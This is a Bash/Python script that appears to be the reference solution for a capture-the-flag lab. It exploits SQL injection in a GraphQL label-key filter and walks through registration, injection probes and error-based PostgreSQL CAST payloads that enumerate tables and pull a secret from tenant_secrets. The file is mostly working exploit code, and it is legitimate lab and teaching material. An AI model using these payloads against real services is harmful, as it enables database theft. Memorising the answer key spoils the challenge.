#!/usr/bin/env bash
# ============================================================
# LabelKeySQLi (labs30) — reference solution: PostgreSQL
# injection via labels[].key on two GraphQL routes
#
# Chain: register -> baseline assets query -> prove the key is
# injectable while value stays parameterized -> confirm the same
# bug on assetSearchSuggestions -> enumerate public schema via an
# error-based cast -> extract the flag from tenant_secrets.
#
# Usage: ./run.sh [base-url]     (default http://localhost:8110)
# Prints the flag on stdout; exit 0 on success.
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8110}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

python3 - "$BASE" "$SCRIPT_DIR/../challenge/.env" <<'PY'
from __future__ import annotations

import json
import os
import re
import sys
import urllib.error
import urllib.request
from pathlib import Path

base = sys.argv[1].rstrip("/")
env_path = Path(sys.argv[2])


def read_expected_flag(path: Path) -> str:
    for line in path.read_text().splitlines():
        if line.startswith("FLAG="):
            return line.split("=", 1)[1].strip().strip('"')
    raise SystemExit("[-] failed: FLAG missing from challenge/.env")


def http_json(path: str, payload: dict, token: str | None = None) -> tuple[int, dict, str]:
    data = json.dumps(payload).encode()
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(base + path, data=data, headers=headers)
    try:
      with urllib.request.urlopen(req) as resp:
        raw = resp.read().decode()
        return resp.status, json.loads(raw), raw
    except urllib.error.HTTPError as exc:
        raw = exc.read().decode()
        try:
            parsed = json.loads(raw)
        except json.JSONDecodeError:
            parsed = {}
        return exc.code, parsed, raw


def gql(query: str, variables: dict, token: str) -> dict:
    _, parsed, raw = http_json("/query/ui", {"query": query, "variables": variables}, token)
    if not isinstance(parsed, dict):
        raise SystemExit(f"[-] failed: non-JSON GraphQL response: {raw}")
    return parsed


def gql_message(response: dict) -> str:
    if response.get("errors"):
        return str(response["errors"][0].get("message", ""))
    return ""


def must(condition: bool, message: str) -> None:
    if not condition:
        raise SystemExit(f"[-] failed: {message}")


def extract_flag(text: str) -> str:
    m = re.search(r"FLAG\{nusasec-[0-9a-f]{32}\}", text)
    return m.group(0) if m else ""


expected_flag = read_expected_flag(env_path)

email = f"student-{os.getpid()}-{os.getppid()}@arena.local"
password = "Student123!"
register_status, register_data, _ = http_json(
    "/api/register",
    {"email": email, "password": password, "fullName": "Student One"},
)
must(register_status in (200, 201), f"registration failed: {register_data}")
token = register_data.get("token", "")
space_mrn = register_data.get("primarySpaceMrn", "")
must(token, "registration returned no bearer token")
must(space_mrn, "registration returned no space MRN")

assets_query = """
query Assets($spaceMrn: String!, $labels: [KeyValueInput!]) {
  assets(spaceMrn: $spaceMrn, first: 10, labels: $labels) {
    totalCount
  }
}
"""

suggestions_query = """
query Suggestions($input: AssetSearchSuggestionsInput!) {
  assetSearchSuggestions(input: $input)
}
"""

def assets_response(key: str, value: str) -> dict:
    return gql(
        assets_query,
        {
            "spaceMrn": space_mrn,
            "labels": [{"key": key, "value": value}],
        },
        token,
    )

def suggestions_response(key: str, value: str) -> dict:
    return gql(
        suggestions_query,
        {
            "input": {
                "spaceMrn": space_mrn,
                "query": "pilot",
                "limit": 10,
                "labelFilter": [{"key": key, "value": value}],
            }
        },
        token,
    )

print("[*] confirming a normal label filter works", file=sys.stderr)
baseline = assets_response("distro-id", "debian")
baseline_total = baseline.get("data", {}).get("assets", {}).get("totalCount")
must(isinstance(baseline_total, int) and baseline_total > 0, f"unexpected baseline response: {baseline}")

print("[*] proving the value is parameterized while the key is not", file=sys.stderr)
safe_value = assets_response("distro-id", "b'")
must("errors" not in safe_value, f"value should be safe, got: {safe_value}")
unsafe_key = assets_response("distro-id'", "debian")
must("errors" in unsafe_key, "odd quote count on the key did not fail")
even_key = assets_response("distro-id''", "debian")
must("errors" not in even_key, "even quote count on the key should parse cleanly")

print("[*] confirming the second GraphQL route is vulnerable too", file=sys.stderr)
route2 = suggestions_response("a')", "")
must("errors" in route2, f"assetSearchSuggestions did not error: {route2}")

print("[*] enumerating public schema with an error-based cast", file=sys.stderr)
schema_payload = "distro-id' = 'debian' AND (SELECT CAST((SELECT string_agg(table_name, ',' ) FROM (SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' ORDER BY table_name) t) AS int)) = 1 AND '"
schema_err = assets_response(schema_payload, "")
schema_msg = gql_message(schema_err)
must(schema_msg, f"schema enumeration returned no error: {schema_err}")
schema_tables = ""
m = re.search(r'invalid input syntax for type integer: "([^"]+)"', schema_msg)
if m:
    schema_tables = m.group(1)
else:
    # Some PostgreSQL builds wrap the payload in a different error string.
    m = re.search(r'"([^"]*tenant_secrets[^"]*)"', schema_msg)
    if m:
        schema_tables = m.group(1)
must(schema_tables, f"could not recover table names from: {schema_msg}")
print(f"[*] public tables: {schema_tables}", file=sys.stderr)
must("tenant_secrets" in schema_tables, "tenant_secrets table was not enumerated")

print("[*] extracting the flag from tenant_secrets via the cast-error channel", file=sys.stderr)
flag_payload = "distro-id' = 'debian' AND (SELECT CAST((SELECT secret_value FROM tenant_secrets WHERE secret_name = 'flag' LIMIT 1) AS int)) = 1 AND '"
flag_err = assets_response(flag_payload, "")
flag_msg = gql_message(flag_err)
flag = extract_flag(flag_msg)
if not flag:
    # Fall back to scanning the full payload, since PostgreSQL may fold the message differently.
    flag = extract_flag(str(flag_err))
must(flag, f"no flag recovered: {flag_err}")

print(flag)
must(flag == expected_flag, f"got {flag}, expected {expected_flag}")
PY
